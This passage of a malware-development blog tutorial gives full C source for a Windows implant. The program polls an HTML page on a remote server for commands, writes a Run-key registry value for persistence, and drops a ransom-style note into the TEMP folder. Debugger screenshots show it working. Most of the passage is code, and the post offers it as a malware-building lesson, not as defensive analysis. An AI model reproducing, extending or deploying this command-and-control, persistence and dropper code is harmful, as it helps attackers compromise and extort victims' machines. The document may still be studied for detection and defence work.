  <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">subKey</span> <span class="o">=</span> <span class="s">"SOFTWARE</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">CurrentVersion</span><span class="se">\\</span><span class="s">Run"</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">valueName</span> <span class="o">=</span> <span class="s">"LockbitSupp~lol"</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">valueData</span> <span class="o">=</span> <span class="s">"You have been infected with FunnyLockbit!"</span><span class="p">;</span>

  <span class="n">LONG</span> <span class="n">result</span> <span class="o">=</span> <span class="n">RegCreateKeyExA</span><span class="p">(</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span> <span class="n">subKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">REG_OPTION_NON_VOLATILE</span><span class="p">,</span> <span class="n">KEY_WRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hKey</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">ERROR_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Set the value</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">RegSetValueExA</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="n">valueName</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">REG_SZ</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">valueData</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">valueData</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">ERROR_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Value added correctly!"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Error %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="p">}</span>
    <span class="c1">// Close the key</span>
    <span class="n">RegCloseKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to open or create registry key. Error code: %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
  <span class="p">}</span>
<span class="p">};</span>
</code></pre></div></div>

<h2 id="dropping-a-file">dropping a file<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-05/#dropping-a-file" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>This is a simple functionality, dropping file can be used when for example dropping ransomware notes, instructions for the victim, any any dummy rabbit holes for incident responders, etc.</p>

<p>We will drop a temporarily file, so we will choose <strong>TEMP</strong> path, we can use <code class="language-plaintext highlighter-rouge">GetTempPathA()</code> to get the path of TEMP directory.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">FileAct</span><span class="p">()</span> <span class="p">{</span>

  <span class="kt">char</span> <span class="n">tempPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
  <span class="n">DWORD</span> <span class="n">result</span> <span class="o">=</span> <span class="n">GetTempPathA</span><span class="p">(</span><span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">tempPath</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to get the temporary directory path.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="p">}</span>

  <span class="c1">// Create the file path in the temporary directory</span>
  <span class="kt">char</span> <span class="n">filePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
  <span class="n">sprintf</span><span class="p">(</span><span class="n">filePath</span><span class="p">,</span> <span class="s">"%sWelcomeToDarkSide.txt"</span><span class="p">,</span> <span class="n">tempPath</span><span class="p">);</span>

  <span class="c1">// Open the file for writing</span>
  <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">filePath</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CREATE_ALWAYS</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to create the file. Error code: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
  <span class="p">}</span>

  <span class="c1">// Write the string to the file</span>
  <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="s">"You have been infected with a Ransomware, please call me so I can give you my bank account to pay</span><span class="se">\n</span><span class="s"> Number: 911"</span><span class="p">;</span>
  <span class="n">DWORD</span> <span class="n">bytesWritten</span><span class="p">;</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">WriteFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">bytesWritten</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to write to the file. Error code: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>

  <span class="p">}</span>

  <span class="c1">// Close the file handle</span>
  <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">File created and data written successfully.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

<span class="p">}</span>
</code></pre></div></div>

<p>Here <strong>CreateFile()</strong> and <strong>WriteFile()</strong> are used after each other to create the file first then do a write operation.</p>

<p>Now let’s assemble the code and fire up the server again and try to change the commands within HTML page.</p>

<h2 id="executing" class="active">Executing<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-05/#executing" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/5-2.png" alt="P3"></p>

<p>As we can see above the HTML file holds <strong>prs</strong> command, let’s execute now and breakpoint inside the parsing function to check where the execution will go.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/5-3.png" alt="P4"></p>

<p>After hitting the breakpoint we can see that the command was successfully sanitized from the html page, and this will be transferring the execution to <strong>RegAct()</strong> function, if we continue we can see that the value was added to the registry:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/5-4.png" alt="P5"></p>

<blockquote>
  <p>Note: you will need admin permissions to if you used <strong>HKEY_LOCAL_MACHINE</strong>, but using <strong>HKEY_CURRENT_USER</strong> will work find though it will only affect user’s login.</p>
</blockquote>

<p>Next let’s try changing the HTML file to another command:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/5-5.png" alt="P6"></p>

<p>And once executing we can see that our breakpoint on <strong>FileAct()</strong> was triggered:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/5-6.png" alt="P7"></p>

<p>And the file was created:
<img src="https://ry0dan.github.io/assets/images/malware-development/5-7.png" alt="P8"></p>

<p>The full code:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Wininet.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wchar.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">FileAct</span><span class="p">()</span> <span class="p">{</span>

  <span class="kt">char</span> <span class="n">tempPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
  <span class="n">DWORD</span> <span class="n">result</span> <span class="o">=</span> <span class="n">GetTempPathA</span><span class="p">(</span><span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">tempPath</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to get the temporary directory path.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="p">}</span>

  <span class="c1">// Create the file path in the temporary directory</span>
  <span class="kt">char</span> <span class="n">filePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
  <span class="n">sprintf</span><span class="p">(</span><span class="n">filePath</span><span class="p">,</span> <span class="s">"%sWelcomeToDarkSide.txt"</span><span class="p">,</span> <span class="n">tempPath</span><span class="p">);</span>

  <span class="c1">// Open the file for writing</span>
  <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">filePath</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CREATE_ALWAYS</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to create the file. Error code: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
  <span class="p">}</span>

  <span class="c1">// Write the string to the file</span>
  <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="s">"You have been infected with a Ransomware, please call me so I can give you my bank account to pay</span><span class="se">\n</span><span class="s"> Number: 911"</span><span class="p">;</span>
  <span class="n">DWORD</span> <span class="n">bytesWritten</span><span class="p">;</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">WriteFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">bytesWritten</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to write to the file. Error code: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>

  <span class="p">}</span>

  <span class="c1">// Close the file handle</span>
  <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">File created and data written successfully.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

<span class="p">}</span>

<span class="kt">void</span> <span class="n">RegAct</span><span class="p">()</span> <span class="p">{</span>

  <span class="n">HKEY</span> <span class="n">hKey</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">subKey</span> <span class="o">=</span> <span class="s">"SOFTWARE</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">CurrentVersion</span><span class="se">\\</span><span class="s">Run"</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">valueName</span> <span class="o">=</span> <span class="s">"LockbitSupp~lol"</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">valueData</span> <span class="o">=</span> <span class="s">"You have been infected with FunnyLockbit!"</span><span class="p">;</span>

  <span class="n">LONG</span> <span class="n">result</span> <span class="o">=</span> <span class="n">RegCreateKeyExA</span><span class="p">(</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span> <span class="n">subKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">REG_OPTION_NON_VOLATILE</span><span class="p">,</span> <span class="n">KEY_WRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hKey</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">ERROR_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Set the value</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">RegSetValueExA</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="n">valueName</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">REG_SZ</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">valueData</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">valueData</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">ERROR_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Value added correctly!"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Error %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="p">}</span>
    <span class="c1">// Close the key</span>
    <span class="n">RegCloseKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to open or create registry key. Error code: %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
  <span class="p">}</span>
<span class="p">};</span>


<span class="kt">void</span> <span class="n">parseHTML</span><span class="p">(</span><span class="kt">wchar_t</span><span class="o">*</span> <span class="n">html</span><span class="p">)</span> <span class="p">{</span>

  <span class="k">const</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">start_tag</span> <span class="o">=</span> <span class="s">L"&lt;strong&gt;"</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">wcsstr</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="n">start_tag</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">pos</span> <span class="o">+=</span> <span class="n">wcslen</span><span class="p">(</span><span class="n">start_tag</span><span class="p">);</span>
    <span class="kt">wchar_t</span> <span class="n">word</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>


    <span class="n">wcsncpy_s</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="s">L"prs"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>

      <span class="n">RegAct</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="s">L"drp"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>

      <span class="n">FileAct</span><span class="p">();</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>




<span class="n">BOOL</span> <span class="n">FetchData</span><span class="p">(</span><span class="kt">wchar_t</span><span class="o">**</span> <span class="n">pPointer</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">HINTERNET</span> <span class="n">hInternet</span> <span class="o">=</span> <span class="n">InternetOpenW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">hInternet</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"InternetOpen failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">HINTERNET</span> <span class="n">hInternetUrl</span> <span class="o">=</span> <span class="n">InternetOpenUrlW</span><span class="p">(</span><span class="n">hInternet</span><span class="p">,</span> <span class="s">L"http://10.0.0.5:8000/index.html"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">INTERNET_FLAG_HYPERLINK</span> <span class="o">|</span> <span class="n">INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">hInternetUrl</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"InternetOpenUrl failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">PBYTE</span> <span class="n">pBytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>

  <span class="n">DWORD</span> <span class="n">dwBytesRead</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">InternetReadFile</span><span class="p">(</span><span class="n">hInternetUrl</span><span class="p">,</span> <span class="n">pBytes</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesRead</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Reading file failed error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="kt">int</span> <span class="n">bufferSize</span> <span class="o">=</span> <span class="n">MultiByteToWideChar</span><span class="p">(</span><span class="n">CP_UTF8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">pBytes</span><span class="p">,</span> <span class="n">dwBytesRead</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">bufferSize</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Error in MultiByteToWideChar: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternetUrl</span><span class="p">);</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
    <span class="n">LocalFree</span><span class="p">(</span><span class="n">pBytes</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">wideString</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span><span class="o">*</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">bufferSize</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">wchar_t</span><span class="p">));</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">wideString</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Memory allocation failed"</span><span class="p">);</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternetUrl</span><span class="p">);</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
    <span class="n">LocalFree</span><span class="p">(</span><span class="n">pBytes</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">MultiByteToWideChar</span><span class="p">(</span><span class="n">CP_UTF8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">pBytes</span><span class="p">,</span> <span class="n">dwBytesRead</span><span class="p">,</span> <span class="n">wideString</span><span class="p">,</span> <span class="n">bufferSize</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Error in MultiByteToWideChar: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternetUrl</span><span class="p">);</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
    <span class="n">LocalFree</span><span class="p">(</span><span class="n">pBytes</span><span class="p">);</span>
    <span class="n">LocalFree</span><span class="p">(</span><span class="n">wideString</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="o">*</span><span class="n">pPointer</span> <span class="o">=</span> <span class="n">wideString</span><span class="p">;</span>

  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>

  <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">Space</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>

  <span class="n">FetchData</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Space</span><span class="p">);</span>

  <span class="n">parseHTML</span><span class="p">(</span><span class="n">Space</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Thank you for reading :).</p>

        
      </section>

      

      

      
  

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    

    
  
  














  

</body></html>